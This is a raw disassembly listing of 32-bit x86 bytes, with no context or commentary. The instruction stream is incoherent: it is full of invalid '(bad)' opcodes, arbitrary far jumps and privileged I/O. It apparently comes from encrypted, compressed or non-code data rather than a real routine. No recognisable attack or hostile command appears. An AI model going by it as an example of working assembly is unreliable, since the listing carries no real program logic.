  408928:	fs pop ss
  40892a:	enter  0x43ef,0x8d
  40892e:	mov    ds:0x3918986d,al
  408933:	pop    esi
  408934:	mov    ah,0x70
  408936:	fisub  WORD PTR [ebx]
  408938:	xor    cl,BYTE PTR [edx]
  40893a:	std    
  40893b:	pop    edx
  40893c:	loope  0x4089bc
  40893e:	lds    ecx,FWORD PTR [ecx]
  408940:	sbb    al,0xcb
  408942:	mov    edx,0x2058ed5e
  408947:	add    bl,BYTE PTR [ecx-0x2a]
  40894a:	jecxz  0x4088e9
  40894c:	add    DWORD PTR [edx-0x13c6371d],ebx
  408952:	clc    
  408953:	or     bl,BYTE PTR [esi-0x7f]
  408956:	inc    edx
  408957:	adc    BYTE PTR [edi+0x30cd188e],0xac
  40895e:	rcl    ebx,1
  408960:	or     dl,cl
  408962:	js     0x4088e8
  408964:	mov    ecx,0x305969fc
  408969:	gs scas eax,DWORD PTR es:[edi]
  40896b:	mov    cl,0xcc
  40896d:	mov    WORD PTR [ecx+ecx*1+0x74],?
  408971:	sbb    bl,BYTE PTR [ecx]
  408973:	add    al,0x54
  408975:	push   ebp
  408976:	adc    DWORD PTR [ecx-0xf],ebx
  408979:	pop    esp
  40897a:	mov    al,ds:0x11ac1df7
  40897f:	ins    DWORD PTR es:[edi],dx
  408980:	xchg   ebx,eax
  408981:	jns    0x40897c
  408983:	inc    ebp
  408984:	jmp    0x658c:0xcf78e212
  40898b:	ret    
  40898c:	cmp    esi,DWORD PTR [eax]
  40898e:	xchg   DWORD PTR [ebx],edx
  408990:	inc    ebx
  408991:	out    0x68,eax
  408993:	jmp    0xc7aff494
  408998:	(bad)  
  408999:	out    dx,eax
  40899a:	imul   cl
  40899c:	jg     0x4089d2
  40899e:	and    DWORD PTR [esi],edi
  4089a0:	dec    BYTE PTR [edi+0x0]
  4089a3:	mov    eax,ds:0xc705dfd6
  4089a8:	std    
  4089a9:	xchg   edx,eax
  4089aa:	adc    esp,esi
  4089ac:	leave  
  4089ad:	push   edi
  4089ae:	(bad)  
  4089af:	mov    ebp,0xefa7feb0
  4089b4:	cld    
  4089b5:	sub    ah,cl
  4089b7:	jle    0x408988
  4089b9:	fidiv  DWORD PTR [edi-0x76]
  4089bc:	sti    
  4089bd:	xchg   esp,eax
  4089be:	out    dx,eax
  4089bf:	mov    edi,0x267937c2
  4089c4:	sub    BYTE PTR [edx+0x1d443a66],cl
  4089ca:	jmp    0x17af:0xeb143cb4
  4089d1:	ret    0x7c4a
  4089d4:	lock sub eax,0x8b517974
  4089da:	nop
  4089db:	cmp    BYTE PTR [ebp-0x5e7714e],ch
  4089e1:	mov    bl,0x58
  4089e3:	enter  0xd1ec,0xb5
  4089e7:	add    eax,0x8204df91
  4089ec:	je     0x408a6c
  4089ee:	call   0x7c993d1d
  4089f3:	ret    
  4089f4:	mov    ah,0x1c
  4089f6:	loopne 0x408a63
  4089f8:	mov    al,0x8a
  4089fa:	or     eax,ecx
  4089fc:	aam    0x52
  4089fe:	das    
  4089ff:	cwde   
  408a00:	test   eax,0xc299e60b
  408a05:	pop    es
  408a06:	ins    DWORD PTR es:[edi],dx
  408a07:	int3   
  408a08:	xchg   edx,eax
  408a09:	ds jae 0x408a5f
  408a0c:	cmp    bh,BYTE PTR [ecx-0x19097f24]
  408a12:	int    0x2a
  408a14:	sub    BYTE PTR [esi],0x37
  408a17:	int    0x48
  408a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a1a:	ret    0x738c
  408a1d:	sahf   
  408a1e:	add    al,0x8b
  408a20:	out    0xd6,eax
  408a22:	sub    al,0x3c
  408a25:	int    0x43
  408a27:	inc    edx
  408a28:	cmc    
  408a29:	push   ds
  408a2a:	int3   
  408a2b:	aam    0x6e
  408a2d:	je     0x4089e0
  408a2f:	fnsave ds:0x91a52efc
  408a35:	shr    BYTE PTR [ebx+ecx*1+0x6b9980a],cl
  408a3c:	adc    al,0xcf
  408a3e:	mov    BYTE PTR [ebx-0x6b],cl
  408a41:	xchg   ebp,eax
  408a42:	jle    0x408aa9
  408a44:	add    ah,BYTE PTR [edx+0x1e]
  408a47:	bound  ebx,QWORD PTR [ecx-0x6f5d51f4]
  408a4d:	aad    0xd7
  408a4f:	ss rcl esi,0xf9
  408a53:	in     al,dx
  408a54:	test   al,0x96
  408a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a57:	sbb    al,0xdb
  408a59:	scas   eax,DWORD PTR es:[edi]
  408a5a:	fnstenv [esi+0x2]
  408a5d:	iret   
  408a5e:	pop    ds
  408a5f:	sub    DWORD PTR ds:0xa5cc6d9f,esi
  408a65:	sub    ch,BYTE PTR [edi-0x30eb3901]
  408a6b:	repz cli 
  408a6d:	push   esi
  408a6e:	lahf   
  408a6f:	es and eax,0xfa7adb1b
  408a75:	cld    
  408a76:	jp     0x408abd
  408a78:	push   ebx
  408a79:	mov    ch,0x17
  408a7b:	mov    ch,0x6a
  408a7d:	stos   DWORD PTR es:[edi],eax
  408a7e:	aam    0xb3
  408a80:	out    dx,eax
  408a81:	(bad)  
  408a83:	mul    BYTE PTR ds:0x2e4979ce
  408a89:	inc    esi
  408a8a:	dec    esi
  408a8b:	lods   al,BYTE PTR ds:[esi]
  408a8c:	push   0xd18c917f
  408a91:	pop    edi
  408a92:	fcomp  st(4)
  408a94:	push   ecx
  408a95:	or     edi,DWORD PTR [eax-0x3c]
  408a98:	out    0xc1,al
  408a9a:	mov    ds:0xe9cf4d4,al
  408a9f:	pop    eax
  408aa0:	mov    gs,WORD PTR [eax]
  408aa2:	shl    BYTE PTR [edi-0x51],cl
  408aa5:	fild   DWORD PTR [edx+edx*2+0x4a24225b]
  408aac:	out    0x83,al
  408aae:	outs   dx,DWORD PTR ds:[esi]
  408aaf:	sbb    ecx,ebx
  408ab1:	mov    ebp,0x74fbafe2
  408ab6:	cmp    bl,bl
  408ab8:	ret    0xd0d3
  408abb:	fsin   
  408abd:	mov    esp,0x550921bb
  408ac2:	mov    cl,0xb9
  408ac4:	jbe    0x408b21
  408ac6:	cdq    
  408ac7:	hlt    
  408ac8:	dec    ecx
  408ac9:	retf   0xac38
  408acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408acd:	push   ebp
  408ace:	test   eax,0x5e2d0611
  408ad3:	xchg   edx,eax
  408ad4:	inc    esp
  408ad5:	ja     0x408a6b
  408ad7:	aad    0xe6
  408ad9:	sub    eax,0x4029250c
  408ade:	push   esp
  408adf:	in     eax,0x46
  408ae1:	add    eax,0xe626e7fd
  408ae6:	imul   esi,DWORD PTR [esi+0x58],0x57473d06
  408aed:	stos   BYTE PTR es:[edi],al
  408aee:	mov    ch,0xcb
  408af0:	add    al,0x52
  408af2:	xlat   BYTE PTR ds:[ebx]
  408af3:	sti    
  408af4:	loopne 0x408abb
  408af6:	xchg   BYTE PTR [edx-0x189d5159],dl
  408afc:	pushf  
  408afd:	ds out dx,eax
  408aff:	cld    
  408b00:	jmp    0x408b81
  408b02:	push   cs
  408b03:	mov    cl,0x54
  408b05:	cmp    cl,BYTE PTR [ebx+0xf]
  408b08:	add    ch,ch
  408b0a:	jg     0x408a98
  408b0c:	inc    edx
  408b0d:	(bad)  
  408b0e:	and    ebx,DWORD PTR [edi-0x4676e52f]
  408b14:	pop    edi
  408b15:	and    eax,0x72553046
  408b1a:	add    BYTE PTR [ebp-0x68bf8623],0x5e
  408b21:	mov    dh,0x83
  408b23:	sbb    ecx,DWORD PTR [edx]
  408b25:	mov    esi,0x70dec0f5
  408b2a:	loopne 0x408b9c
  408b2c:	dec    ecx
  408b2d:	jg     0x408b3e
  408b2f:	stc    
  408b30:	xchg   DWORD PTR [ebx-0x3e],edx
  408b33:	pop    es
  408b34:	es inc edx
  408b36:	aad    0x6e
  408b38:	in     eax,0x21
  408b3a:	mov    ah,0x7c
  408b3c:	inc    ecx
  408b3d:	cmp    edi,eax
  408b3f:	or     al,0x3b
  408b41:	jmp    0x19b31a0a
  408b46:	not    dh
  408b48:	rol    BYTE PTR [edx],1
  408b4a:	stos   DWORD PTR es:[edi],eax
  408b4b:	xor    edx,DWORD PTR [ebp+0x133899fa]
  408b51:	jl     0x408bac
  408b53:	(bad)  
  408b54:	lods   eax,DWORD PTR ds:[esi]
  408b55:	adc    DWORD PTR [esi-0x53],edx
  408b58:	mov    ?,ebp
  408b5a:	out    0xe2,eax
  408b5c:	cmp    ebx,DWORD PTR [edi+0x582215b6]
  408b62:	xlat   BYTE PTR ds:[ebx]
  408b63:	stc    
  408b64:	jl     0x408b00
  408b66:	adc    al,0x40
  408b68:	pop    ss
  408b69:	or     bh,BYTE PTR [eax+edi*4-0x3b2d85a4]
  408b70:	inc    ebp
  408b71:	pop    edx
  408b72:	adc    BYTE PTR [ecx],0x7e
  408b75:	and    bl,BYTE PTR [ebx+edi*1-0x35]
  408b79:	or     DWORD PTR [eax+0x73],ebp
  408b7c:	or     al,0x2d
  408b7e:	iret   
  408b7f:	out    dx,al
  408b80:	ret    
  408b81:	nop
  408b82:	outs   dx,BYTE PTR ds:[esi]
  408b83:	das    
  408b84:	ss push edx
  408b86:	fisttp QWORD PTR [edi]
  408b88:	mov    ebx,edx
  408b8a:	ja     0x408b77
  408b8c:	xor    ch,BYTE PTR [ebp-0x1d]
  408b8f:	jno    0x408b39
  408b91:	mov    eax,ecx
  408b93:	lea    ecx,[ecx+0x641e96c7]
  408b99:	mov    esp,0x4fe711fe
  408b9e:	cmp    DWORD PTR [ecx-0x453836e4],eax
  408ba4:	clc    
  408ba5:	div    BYTE PTR [ecx]
  408ba7:	aad    0x19
  408ba9:	push   edx
  408baa:	ror    DWORD PTR [eax-0x69],1
  408bad:	cmp    al,0xf1
  408baf:	mov    eax,ds:0x26078eec
  408bb4:	and    ecx,DWORD PTR [edx]
  408bb6:	adc    eax,0x9f7d725e
  408bbb:	inc    edi
  408bbc:	mov    ebp,DWORD PTR [edi-0x6a]
  408bbf:	xor    edi,DWORD PTR [edi-0x72]
  408bc2:	jmp    0xa3101c95
  408bc7:	inc    ebx
  408bc8:	jge    0x408b77
  408bca:	rcl    BYTE PTR [ebp+edx*8-0x52e436ee],1
  408bd1:	push   ds
  408bd2:	daa    
  408bd3:	lds    ebp,FWORD PTR [esi]
  408bd5:	push   ds
  408bd6:	mov    ebx,0xc947c458
  408bdb:	push   0x6e50f2f2
  408be0:	mov    ds:0xa8dd55f0,al
  408be5:	mov    ds:0xde68efa2,al
  408bea:	fwait
  408beb:	dec    ebx
  408bec:	data16 fidiv DWORD PTR [esi]
  408bef:	adc    al,BYTE PTR [edx-0x4c8042d4]
  408bf5:	adc    DWORD PTR [ebx+0x4fbc1698],esp
  408bfb:	jb     0x408c0e
  408bfd:	and    eax,0x5de277d8
  408c02:	jno    0x408bdc
  408c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c05:	and    edx,eax
  408c07:	and    al,0x41
  408c09:	xlat   BYTE PTR ds:[ebx]
  408c0a:	dec    ecx
  408c0b:	mov    WORD PTR [esi-0x6af44afd],es
  408c11:	cdq    
  408c12:	iret   
  408c13:	xchg   dl,dh
  408c15:	push   esp
  408c16:	sbb    DWORD PTR [ebx+0x6e20bb62],edi
  408c1c:	mov    esp,0x8af6fd9
  408c21:	or     eax,0xe786a3b8
  408c26:	mov    dl,BYTE PTR [esi]
  408c28:	xchg   BYTE PTR [edi+0x16],bl
  408c2b:	mov    dh,BYTE PTR [esi]
  408c2d:	push   ebp
  408c2e:	ins    BYTE PTR es:[edi],dx
  408c2f:	fdivr  st,st(3)
  408c31:	push   ss
  408c32:	and    DWORD PTR [ecx-0x76],0x58ff1d1f
  408c39:	nop
  408c3a:	mov    esi,0x62f56a17
  408c3f:	fnstenv [eax-0x24]
  408c42:	(bad)  
  408c44:	addr16 mov edi,0x9abd3a89
  408c4a:	push   edx
  408c4b:	(bad)  
  408c4c:	(bad)  
  408c4d:	lahf   
  408c4e:	jecxz  0x408be2
  408c50:	fbld   TBYTE PTR [esi-0x1f]
  408c53:	add    BYTE PTR [ebx],bl
  408c55:	aas    
  408c56:	sbb    ebp,ebx
  408c58:	jnp    0x408c22
  408c5a:	jmp    0x1d60:0xbd967eec
  408c61:	xchg   ebp,eax
  408c62:	or     eax,0x9d6e39d0
  408c67:	mov    dh,BYTE PTR [eax-0x363eca75]
  408c6d:	fcom   DWORD PTR [edi-0xe30541f]
  408c73:	inc    eax
  408c74:	lea    ebx,[ecx+edi*8-0x7a]
  408c78:	mov    ds:0xdea7a8c7,al
  408c7d:	jno    0x408c85
  408c7f:	arpl   WORD PTR [ebp+ebx*4+0x72],bp
  408c83:	rcl    BYTE PTR [eax+eax*1],0xb6
  408c87:	test   ch,cl
  408c89:	out    dx,al
  408c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c8b:	mov    al,ds:0x421deb4b
  408c90:	test   BYTE PTR [ecx-0x124920f1],dh
  408c96:	push   cs
  408c97:	ins    DWORD PTR es:[edi],dx
  408c98:	(bad)  
  408c99:	push   edx
  408c9a:	pop    esp
  408c9b:	cmp    al,0x21
  408c9d:	jmp    0x4abeabe
  408ca2:	les    ebp,FWORD PTR [edi]
  408ca4:	daa    
  408ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca6:	bound  edi,QWORD PTR [eax]
  408ca8:	cmp    BYTE PTR ds:0x58e7470f,dl
  408cae:	mov    bh,0x75
  408cb0:	fidiv  WORD PTR [edx+eax*1]
  408cb3:	xor    BYTE PTR [edi],bl
  408cb5:	dec    bp
  408cb7:	cmp    eax,DWORD PTR [edx-0x42]
  408cba:	scas   al,BYTE PTR es:[edi]
  408cbb:	shr    BYTE PTR [ecx-0x5e6fef20],1
  408cc1:	or     al,0xad
  408cc3:	mov    eax,0xb2ceb2ee
  408cc8:	pop    ebp
  408cc9:	mov    eax,ds:0xc66d9d43
  408cce:	pop    ds
  408ccf:	mov    edi,0x4a8b0a4f
  408cd4:	sbb    al,0xd1
  408cd6:	and    al,0xa8
  408cd8:	sub    bl,BYTE PTR [ecx-0x20]
  408cdb:	xchg   ebp,eax
  408cdc:	mov    cl,0xc9
  408cde:	pushf  
  408cdf:	sub    ebx,DWORD PTR [ecx]
  408ce1:	push   cs
  408ce2:	in     al,0x9f
  408ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce5:	outs   dx,BYTE PTR ds:[esi]
  408ce6:	frstor [esi+0x15]
  408ce9:	mov    ah,0xb8
  408ceb:	stc    
  408cec:	xchg   edx,eax
  408ced:	jp     0x408c9f
  408cef:	mov    ebx,ds
  408cf1:	fs scas al,BYTE PTR es:[edi]
  408cf3:	mov    ecx,0xf5840e59
  408cf8:	and    dh,ch
  408cfa:	ret    0x10a
  408cfd:	fmul   st(6),st
  408cff:	inc    esi
  408d00:	mov    esi,0xfcc15774
  408d05:	jmp    0x72716df9
  408d0a:	loopne 0x408d39
  408d0c:	inc    eax
  408d0d:	sbb    cl,dl
  408d0f:	sahf   
  408d10:	inc    ecx
  408d11:	aas    
  408d12:	mov    al,ds:0xc5e5c204
  408d17:	pop    ebx
  408d18:	pop    ebx
  408d19:	rcl    BYTE PTR [edx-0xa35e5f4],cl
  408d1f:	sbb    ch,0x31
  408d22:	lock add al,0xc
  408d25:	pop    eax
  408d26:	mov    cl,BYTE PTR [ebx]
  408d28:	dec    eax
  408d29:	xor    DWORD PTR [edx+0x7ab5843a],ecx
  408d2f:	jbe    0x408d2b
  408d31:	or     edi,ecx
  408d33:	call   0xf0dd:0xc4f561df
  408d3a:	nop
  408d3b:	xlat   BYTE PTR fs:[ebx]
  408d3d:	clc    
  408d3e:	pop    ds
  408d3f:	sbb    ah,BYTE PTR ds:0xf8e8beb
  408d45:	cld    
  408d46:	sub    cl,bh
  408d48:	and    bl,dh
  408d4a:	jge    0x408d67
  408d4c:	icebp  
  408d4d:	mov    dh,0x57
  408d4f:	ret    
  408d50:	push   ds
  408d51:	clc    
  408d52:	dec    ebx
  408d53:	push   edi
  408d54:	jbe    0x408ce6
  408d56:	add    esp,DWORD PTR [esi+0x1]
  408d59:	lea    eax,[edx]
  408d5b:	imul   esp,DWORD PTR [eax-0x7d],0x6b
  408d5f:	xchg   ebp,ebp
  408d61:	adc    BYTE PTR [edi+eiz*1+0x3],al
  408d65:	xchg   edx,eax
  408d66:	push   ecx
  408d67:	cmp    eax,0xb230b254
  408d6c:	add    eax,0xc4879295
  408d71:	or     BYTE PTR [esi+0x3a18188b],0xd1
  408d78:	fsub   QWORD PTR ds:[edi]
  408d7b:	into   
  408d7c:	in     al,0x3d
  408d7e:	clc    
  408d7f:	fs popf 
  408d81:	idiv   DWORD PTR ds:0xbeda82a5
  408d87:	xchg   ecx,eax
  408d88:	call   FWORD PTR [ecx-0x3f22aaf3]
  408d8e:	sbb    BYTE PTR [esi-0x6969ce02],0xdb
  408d95:	sub    edi,edx
  408d97:	imul   edx,DWORD PTR [esi],0xcde0f5d4
  408d9d:	outs   dx,BYTE PTR ds:[esi]
  408d9e:	jmp    0x5e7fb4fb
  408da3:	fdiv   st(1),st
  408da5:	das    
  408da6:	jl     0x408de6
  408da8:	sub    BYTE PTR [eax-0x49],0x24
  408dac:	mov    ds:0x96ae4939,eax
  408db1:	fsub   QWORD PTR [eax+eax*2-0x7a]
  408db5:	les    ebp,FWORD PTR [ebx-0x79]
  408db8:	mov    esi,0xe9ac5b8b
  408dbd:	das    
  408dbe:	or     eax,0xee659a74
  408dc3:	imul   ebx,ebx,0x49
  408dc6:	repz lea edi,ds:0xf9b75e82
  408dcd:	mov    bh,0xf8
  408dcf:	nop
  408dd0:	sub    eax,0xe5de3af3
  408dd5:	mov    bh,0x4e
  408dd7:	stos   DWORD PTR es:[edi],eax
  408dd8:	in     eax,0x39
  408dda:	outs   dx,BYTE PTR ds:[esi]
  408ddb:	or     al,0xf0
  408ddd:	(bad)
  408de1:	nop    ebp
  408de4:	mov    edi,0xb982e3e
  408de9:	cmp    DWORD PTR [edi],edi
  408deb:	push   esp
  408dec:	push   eax
  408ded:	popa   
  408dee:	leave  
  408def:	inc    ebp
  408df0:	xchg   esp,eax
  408df1:	jns    0x408dda
  408df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df4:	dec    ebx
  408df5:	xchg   ebp,eax
  408df6:	xchg   ebx,eax
  408df7:	out    dx,al
  408df8:	fxch   st(2)
  408dfa:	std    
  408dfb:	mov    bh,0xb3
  408dfd:	sbb    bh,al
  408dff:	dec    ebp
  408e00:	xchg   ebx,eax
  408e01:	loop   0x408da4
  408e03:	sti    
  408e04:	pop    ebp
  408e05:	loop   0x408e0c
  408e07:	sbb    ch,al
  408e09:	pop    ds
  408e0a:	xor    ah,BYTE PTR [ebx+0x5e]
  408e0d:	cmp    bl,BYTE PTR [ebx-0xbac7c80]
  408e13:	pop    ebp
  408e14:	dec    ebx
  408e15:	xor    al,BYTE PTR [esp+esi*1-0x1e035af9]
  408e1c:	fisubr WORD PTR [esp+ebx*1-0x28]
  408e20:	ret    0xca7f
  408e23:	out    dx,eax
  408e24:	cmp    ah,bl
  408e26:	mov    ds:0x9ba213b9,al
  408e2b:	cli    
  408e2c:	scas   eax,DWORD PTR es:[edi]
  408e2d:	push   0xb6115bf6
  408e32:	dec    ebp
  408e33:	retf   0xf803
  408e36:	fistp  DWORD PTR [eax-0x5]
  408e39:	mov    ds:0x953245a4,al
  408e3e:	mov    eax,0x52e3a72f
  408e43:	pop    ds
  408e44:	or     al,0x6a
  408e46:	imul   edx,DWORD PTR [ebp+0x21],0xffffff94
  408e4a:	add    bl,BYTE PTR [esp+0x3c]
  408e4e:	outs   dx,BYTE PTR ds:[esi]
  408e4f:	cwde   
  408e50:	sbb    ah,dl
  408e52:	imul   esp,DWORD PTR [edx-0x530dfcdc],0x8b8a5747
  408e5c:	xor    bl,bh
  408e5e:	cmp    edi,DWORD PTR [ebx-0x6f]
  408e61:	inc    esp
  408e62:	or     BYTE PTR [esi],0x56
  408e65:	jp     0x408e3f
  408e67:	jp     0x408e14
  408e69:	xchg   DWORD PTR [edx+0x69558137],ecx
  408e6f:	mov    eax,0x34dc102f
  408e74:	cdq    
  408e75:	jb     0x408ec0
  408e77:	push   ebx
  408e78:	xlat   BYTE PTR ds:[ebx]
  408e79:	gs daa 
  408e7b:	pushf  
  408e7c:	pop    edx
  408e7d:	or     ah,ch
  408e7f:	loop   0x408e02
  408e81:	and    ecx,DWORD PTR [ecx+edi*4]
  408e84:	jg     0x408e28
  408e86:	dec    ebx
  408e87:	stc    
  408e88:	jo     0x408e8e
  408e8a:	cs xor ch,dh
  408e8d:	push   0x3b
  408e8f:	ret    0x3e95
  408e92:	push   cs
  408e93:	mov    al,ds:0x35c6cbb1
  408e98:	(bad)  
  408e99:	das    
  408e9a:	cmp    eax,0x43c84f52
  408e9f:	es inc eax
  408ea1:	or     eax,0xc5076a2
  408ea6:	cs mov cl,0x3a
  408ea9:	xor    BYTE PTR [esi],ch
  408eab:	jae    0x408e5c
  408ead:	fsub   DWORD PTR [esi+esi*2+0x52]
  408eb1:	aas    
  408eb2:	(bad)  
  408eb3:	les    ebp,FWORD PTR [esi-0x21]
  408eb6:	sbb    al,dh
  408eb8:	in     eax,0xb5
  408eba:	xor    esi,esp
  408ebc:	lahf   
  408ebd:	fwait
  408ebe:	jbe    0x408f35
  408ec0:	push   es
  408ec1:	xor    BYTE PTR [eax],dl
  408ec3:	js     0x408e5a
  408ec5:	stos   DWORD PTR es:[edi],eax
  408ec6:	push   cs
  408ec7:	push   0xffffff8d
  408ec9:	retf   
  408eca:	stos   DWORD PTR es:[edi],eax
  408ecb:	in     al,dx
  408ecc:	cdq    
  408ecd:	jmp    0x577c:0xef17cd5b
  408ed4:	cmc    
  408ed5:	and    DWORD PTR [esi+0x4cbe3657],eax
  408edb:	jge    0x408eba
  408edd:	xchg   esp,eax
  408ede:	pop    es
  408edf:	jmp    0x436f:0x51ddda0e
  408ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee7:	imul   edi,DWORD PTR [esi-0x3d],0x64
  408eeb:	jl     0x408eb4
  408eed:	add    al,0xa3
  408eef:	out    dx,al
  408ef0:	cmc    
  408ef1:	dec    esi
  408ef2:	and    DWORD PTR [ebp-0x3c31e700],ebx
  408ef8:	mov    esi,0x434a6133
  408efd:	ss jecxz 0x408eea
  408f00:	stc    
  408f01:	pop    edx
  408f02:	dec    eax
  408f03:	cmp    DWORD PTR [edi+edi*2-0x3d64e49c],ebp
  408f0a:	outs   dx,BYTE PTR ds:[esi]
  408f0b:	fwait
  408f0c:	xchg   edx,eax
  408f0d:	retf   0x3923
  408f10:	outs   dx,BYTE PTR ds:[esi]
  408f11:	and    al,0x38
  408f13:	daa    
  408f14:	popa   
  408f15:	inc    esi
  408f16:	sub    BYTE PTR [esi+0x6c],ch
  408f19:	sbb    BYTE PTR ss:[ebx+0x2ac77f9a],bh
  408f20:	das    
  408f21:	iret   
  408f22:	adc    al,0xc6
  408f24:	paddb  mm3,mm0
  408f27:	inc    ebp
  408f28:	or     al,0xa9
  408f2a:	mov    bh,0x39
  408f2c:	xchg   sp,ax
  408f2e:	sbb    ebp,ecx
  408f30:	(bad)  
  408f31:	repz dec edi
  408f33:	mov    dh,0x7
  408f35:	cmova  ebx,DWORD PTR [ebp-0x6d]
  408f39:	jno    0x408ee6
  408f3b:	leave  
  408f3c:	jmp    0xf8ff:0x8ed195d9
  408f43:	dec    esi
  408f44:	cmp    al,BYTE PTR [ebx+0x539541e8]
  408f4a:	sbb    BYTE PTR [esi],ch
  408f4c:	mov    eax,ds:0x90c137be
  408f51:	dec    esp
  408f52:	bound  edx,QWORD PTR [ebx+0x5f]
  408f55:	mov    cl,0x4f
  408f57:	loope  0x408f31
  408f59:	daa    
  408f5a:	scas   al,BYTE PTR es:[edi]
  408f5b:	hlt    
  408f5c:	arpl   WORD PTR [edi+0xfd2d789],dx
  408f62:	jle    0x408fcd
  408f64:	mov    ecx,0x5e75f302
  408f69:	xlat   BYTE PTR ds:[ebx]
  408f6a:	mov    bl,0xcd
  408f6c:	push   ss
  408f6d:	lock mov ebx,0x281806ba
  408f73:	lds    edx,FWORD PTR [eax-0xd]
  408f76:	jbe    0x408f84
  408f78:	inc    ebp
  408f79:	sub    BYTE PTR [edi],ah
  408f7b:	or     al,0x4c
  408f7d:	fld    DWORD PTR [eax+0x40]
  408f80:	sti    
  408f81:	mov    esp,0xaff588bc
  408f86:	lds    ecx,FWORD PTR [eax+eax*4]
  408f89:	and    eax,0x5163d081
  408f8e:	jmp    0xb99a:0xc0ccd96c
  408f95:	dec    esp
  408f96:	sub    BYTE PTR [ebx],dl
  408f98:	xor    edi,esi
  408f9a:	sub    al,cl
  408f9c:	lock scas eax,DWORD PTR es:[edi]
  408f9e:	mov    al,0xa7
  408fa0:	mov    al,BYTE PTR [esi]
  408fa2:	stc    
  408fa3:	inc    edx
  408fa4:	pop    edx
  408fa5:	pop    ebx
  408fa6:	ret    0x434a
  408fa9:	push   ss
  408faa:	pop    edi
  408fab:	jmp    0x408fea
  408fad:	pop    ds
  408fae:	shl    DWORD PTR [esi-0x6adba084],cl
  408fb4:	jnp    0x40900d
  408fb6:	jb     0x409025
  408fb8:	inc    esp
  408fb9:	fmul   QWORD PTR [edx-0x605fc5b5]
  408fbf:	mov    ecx,0xec51f8b2
  408fc4:	or     al,0x62
  408fc6:	imul   ecx,esp,0x3f
  408fc9:	or     ecx,DWORD PTR [ecx-0x4f]
  408fcc:	mov    WORD PTR [esi],fs
  408fce:	xchg   DWORD PTR [ecx+0x4e],esi
  408fd1:	jb     0x408fbc
  408fd3:	add    ebx,DWORD PTR [edi-0x39]
  408fd6:	dec    edi
  408fd7:	(bad)  
  408fd9:	mov    ds:0x3cf7e86b,al
  408fde:	ss lahf 
  408fe0:	add    al,0xdc
  408fe2:	ficom  DWORD PTR ds:0x7310d768
  408fe8:	add    BYTE PTR [ecx-0x6e],al
  408feb:	adc    DWORD PTR [esi],eax
  408fed:	pop    edi
  408fee:	jmp    0x408f7b
  408ff0:	retf   
  408ff1:	inc    eax
  408ff2:	or     DWORD PTR [ebx+ebp*4+0x7f526bc],ecx
  408ff9:	aaa    
  408ffa:	stc    
  408ffb:	xchg   ebx,edi
  408ffd:	inc    edx
  408ffe:	cmp    al,0x44
  409000:	scas   al,BYTE PTR es:[edi]
  409001:	or     BYTE PTR [edi-0x18],ch
  409004:	push   es
  409005:	xor    DWORD PTR ds:0x9c0fe6f0,0xffffff90
  40900c:	scas   al,BYTE PTR es:[edi]
  40900d:	sti    
  40900e:	inc    edx
  40900f:	pop    eax
  409010:	mov    DWORD PTR [ecx+0x8],esi
  409013:	sbb    edi,edi
  409015:	inc    ecx
  409016:	in     al,dx
  409017:	jmp    0x824e1f42
  40901c:	rol    DWORD PTR [edx],cl
  40901e:	(bad)  
  40901f:	adc    dh,BYTE PTR [ebp+0x4b]
  409022:	imul   esp,DWORD PTR [ebx+0x543b2114],0xffffff99
  409029:	test   al,0xdf
  40902b:	retf   0xa62e
  40902e:	bound  ebx,QWORD PTR [edi+0x330ecc4b]
  409034:	enter  0x72f9,0xb4
  409038:	mov    ds:0x763635ed,al
  40903d:	adc    edx,DWORD PTR [edi-0x483849f4]
  409043:	stos   DWORD PTR es:[edi],eax
  409044:	cs ror bl,0x68
  409048:	mov    es,WORD PTR [ebx-0x3a62419]
  40904e:	lods   al,BYTE PTR ds:[esi]
  40904f:	shl    BYTE PTR [edx],cl
  409051:	aaa    
  409052:	call   0xa1876d4a
  409057:	pop    esi
  409058:	lea    ecx,[eax+0x53117a72]
  40905e:	ins    BYTE PTR es:[edi],dx
  40905f:	data16 (bad) 
  409062:	push   es
  409063:	mov    al,0x60
  409065:	in     al,dx
  409066:	adc    bl,BYTE PTR [ecx-0x1e4960d1]
  40906c:	lods   eax,DWORD PTR ds:[esi]
  40906d:	rcr    DWORD PTR [eax+eax*2],1
  409070:	mov    ds:0x244e9907,eax
  409075:	gs psubsw mm4,mm7
  409079:	xor    al,0xdb
  40907b:	shl    DWORD PTR [ecx+0x65],0x51
  40907f:	mov    ch,0x7f
  409081:	mov    eax,ds:0xf3eedd22
  409086:	leave  
  409087:	(bad)  
  409088:	pop    edi
  409089:	pop    ebp
  40908a:	sti    
  40908b:	sub    BYTE PTR [esp+ecx*4],bh
  40908e:	fistp  WORD PTR [ebx-0x63]
  409091:	adc    edi,DWORD PTR [esi+0x309f327b]
  409097:	push   eax
  409098:	or     BYTE PTR ds:0x65d22073,0xdd
  40909f:	call   0x75e0:0xbcb78d77
  4090a6:	jle    0x40904d
  4090a8:	pop    ds
  4090a9:	es cdq 
  4090ab:	adc    DWORD PTR [edx-0x5a94cb23],ecx
  4090b1:	mov    ds:0xad72a968,al
  4090b6:	inc    esi
  4090b7:	fldcw  WORD PTR [esi+0x60ea8892]
  4090bd:	les    esi,FWORD PTR [ecx-0x9e01b56]
  4090c3:	inc    ebp
  4090c4:	je     0x40912e
  4090c6:	mov    WORD PTR [ebp+ecx*2+0x60],ds
  4090ca:	mov    WORD PTR [edx-0x4f08092e],cs
  4090d0:	adc    dh,BYTE PTR [esi-0x5483bef1]
  4090d6:	dec    ecx
  4090d7:	sbb    eax,DWORD PTR [esi]
  4090d9:	int    0x8a
  4090db:	dec    edi
  4090dc:	(bad)  
  4090dd:	iret   
  4090de:	cmp    eax,0xce3bce90
  4090e3:	xchg   esp,eax
  4090e4:	test   eax,0xd0be71ac
  4090e9:	xchg   ebx,eax
  4090ea:	or     eax,0xf4c6ce8c
  4090ef:	dec    ebp
  4090f0:	loop   0x4090a4
  4090f2:	ins    DWORD PTR es:[edi],dx
  4090f3:	inc    edx
